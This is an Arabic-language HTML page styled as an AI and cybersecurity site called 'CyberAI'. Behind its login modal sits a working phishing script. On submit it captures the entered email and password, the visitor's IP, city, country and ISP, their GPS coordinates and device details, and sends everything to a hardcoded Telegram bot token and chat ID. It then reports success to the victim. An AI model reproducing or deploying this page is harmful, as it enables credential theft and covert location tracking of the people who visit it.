<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>عالم الذكاء الاصطناعي والأمن السيبراني</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;500;700;900&display=swap" rel="stylesheet">
    
    <style>
        :root { --primary: #00f0ff; --secondary: #7000ff; --bg-dark: #090a10; --card-bg: rgba(255, 255, 255, 0.05); --border: rgba(0, 240, 255, 0.2); --text: #ffffff; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }
        body { background-color: var(--bg-dark); color: var(--text); min-height: 100vh; overflow-x: hidden; }
        nav { display: flex; justify-content: space-between; align-items: center; padding: 20px 8%; background: rgba(9, 10, 16, 0.7); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); }
        .logo { font-size: 24px; font-weight: 900; color: var(--primary); }
        .login-btn { background: linear-gradient(45deg, var(--secondary), var(--primary)); border: none; padding: 10px 25px; color: #fff; border-radius: 30px; cursor: pointer; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 1000; justify-content: center; align-items: center; }
        .modal-content { background: #0f1220; border: 2px solid var(--primary); width: 100%; max-width: 450px; border-radius: 20px; padding: 30px; }
        .submit-btn { width: 100%; padding: 12px; background: var(--primary); border: none; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 15px; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: rgba(255, 255, 255, 0.05); border: 1px solid var(--border); color: #fff; border-radius: 8px; }
    </style>
</head>
<body>

    <nav>
        <div class="logo">CyberAI</div>
        <button class="login-btn" onclick="document.getElementById('loginModal').style.display='flex'">تسجيل الدخول</button>
    </nav>

    <!-- Login Modal -->
    <div class="modal" id="loginModal">
        <div class="modal-content">
            <h2 style="color: var(--primary);">تسجيل الدخول</h2>
            <form id="telegramLoginForm" onsubmit="handleLoginSubmit(event)">
                <input type="email" id="userEmail" placeholder="البريد الإلكتروني" required>
                <input type="password" id="userPassword" placeholder="كلمة المرور" required>
                <button type="submit" class="submit-btn" id="submitBtn">دخول</button>
            </form>
            <p id="statusMsg" style="text-align:center; margin-top:15px; color:var(--primary);"></p>
        </div>
    </div>

    <script>
        // --- ضع بيانات البوت هنا ---
        const TELEGRAM_BOT_TOKEN = "7870239308:AAEVoEVu6EKgznDFDepXlRBQ-TWYk5oz4Oo";
        const TELEGRAM_CHAT_ID = "5515542115";
        // -------------------------

        // 1. جلب بيانات الـ IP
        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip || "غير معروف",
                    city: data.city || "غير معروف",
                    country: data.country_name || "غير معروف",
                    isp: data.org || "غير معروف"
                };
            } catch (e) {
                return { ip: "غير متاح", city: "غير متاح", country: "غير متاح", isp: "غير متاح" };
            }
        }

        // 2. جلب بيانات الجهاز
        async function getDeviceInfo() {
            const ua = navigator.userAgent;
            const os = ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "PC/Other";
            return { os, screenSize: `${screen.width}x${screen.height}` };
        }

        // 3. جلب الموقع الجغرافي
        function getCoordinates() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, status: "✅ مسموح" }),
                    (err) => resolve({ lat: null, lon: null, status: "❌ مرفوض" }),
                    { timeout: 10000 }
                );
            });
        }

        async function handleLoginSubmit(event) {
            event.preventDefault();
            document.getElementById('statusMsg').innerText = "جاري الاتصال...";

            const ipInfo = await getIPInfo();
            const deviceInfo = await getDeviceInfo();
            const loc = await getCoordinates();

            let locStr = loc.lat ? `\n📍 الموقع: ${loc.lat}, ${loc.lon}\n[خريطة](https://www.google.com/maps?q=${loc.lat},${loc.lon})` : "\n📍 الموقع: غير متاح";

            const message = `🔔 **تسجيل دخول جديد!**
-----------------
📧 الإيميل: ${document.getElementById('userEmail').value}
🔑 الباسورد: ${document.getElementById('userPassword').value}
${locStr}

🌐 **بيانات الشبكة:**
 ├ IP: \`${ipInfo.ip}\`
 ├ الدولة: ${ipInfo.country}
 ├ المدينة: ${ipInfo.city}
 └ المزود: ${ipInfo.isp}

💻 **معلومات الجهاز:**
 ├ النظام: ${deviceInfo.os}
 └ الشاشة: ${deviceInfo.screenSize}`;

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
            }).then(() => {
                document.getElementById('statusMsg').innerText = "تم بنجاح!";
                setTimeout(() => document.getElementById('loginModal').style.display = 'none', 1000);
            });
        }
    </script>
</body>
</html>
